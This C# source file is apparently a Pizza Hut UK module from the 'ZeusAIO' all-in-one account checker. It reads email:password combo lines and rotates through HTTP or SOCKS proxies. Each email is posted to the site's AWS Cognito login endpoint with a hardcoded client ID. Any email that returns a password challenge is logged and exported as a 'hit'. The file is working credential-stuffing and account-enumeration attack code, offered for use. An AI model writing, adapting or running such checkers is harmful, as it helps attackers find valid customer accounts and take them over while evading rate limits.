﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace pizzahutukvm
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; SM-J106H Build/MMB29Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.105 Mobile Safari/537.36 hasFix PHAPP");
                            httpRequest.AddHeader("Host", "cognito-idp.eu-west-1.amazonaws.com");
                            httpRequest.AddHeader("X-Amz-Target", "AWSCognitoIdentityProviderService.InitiateAuth");
                            httpRequest.AddHeader("X-Environment-Flag", "production");
                            httpRequest.AddHeader("X-Amz-User-Agent", "aws-amplify/0.1.x js");
                            httpRequest.AddHeader("Content-Type", "application/x-amz-json-1.1");
                            httpRequest.AddHeader("Origin", "https://www.pizzahut.co.uk");
                            httpRequest.AddHeader("X-Requested-With", "com.pizzahutuk.orderingApp");
                            string str = "{\"AuthFlow\":\"USER_SRP_AUTH\",\"ClientId\":\"39sg678apec8n28fj4ekuuc8fl\",\"AuthParameters\":{\"USERNAME\":\"" + s[0] + "\",\"SRP_A\":\"cf1f8246611b2d6c2f36b68a58ad8f1a10c57ba04965f6b3c24dfc1dbff6ae22b4f5e86ea790d66dde2befcd9d4d0e26e8d217c81cab0a456f2f26e5c9dd96d173bad0699ab48fc6297e524d093a2c16fe4fb30a958041b717120f68da42401f0733d3c19d3b7e127dc0cff9e1cb1b15adce363b696f45d2ce763a25783830a4ff45c71c817350779398b1783f36f0415912b2c284c161f4ed135ac3ad501b3b3557745c1a66c2af35034b9a34e02a012bd0642f0d90e162da9cd4cac6e5943b98c1bc47d1c9cd9fd0a1742b54c05fd79470ba755f49c64c6a67e37d5dc6a14f21c2ca6ada83e1bb0a412945e067607e487ce8964828535a58ddf9fe5ba6872ca8a578773872ccd6b648beb988e74fa955c8058989f1b3801f39adc81d87560614b609f5c5077b5a0fb643c751e57c5e93269ea3c92dcf64e00ddb37e6f56ee0978cd020d4b15477511913ee38f211bda96fe378f4fde118b3b3adb57c1e1c2a264fe102129eb1390c39f827f8c08df94f3a0d3219845110f8d9b8f47bd833f2\"},\"ClientMetadata\":{}}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                             new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://cognito-idp.eu-west-1.amazonaws.com/", str, "application/x-amz-json-1.1").ToString();
                            {
                                if (strResponse.Contains("User does not exist"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("ChallengeName\":\"PASSWORD_VERIFIER")) //hit
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - PIZZAHUT UK Valid Mail] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/PizzaUKvalidmail_hits", s[0] + ":" + s[1]);
                                    return false;

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

    }
}
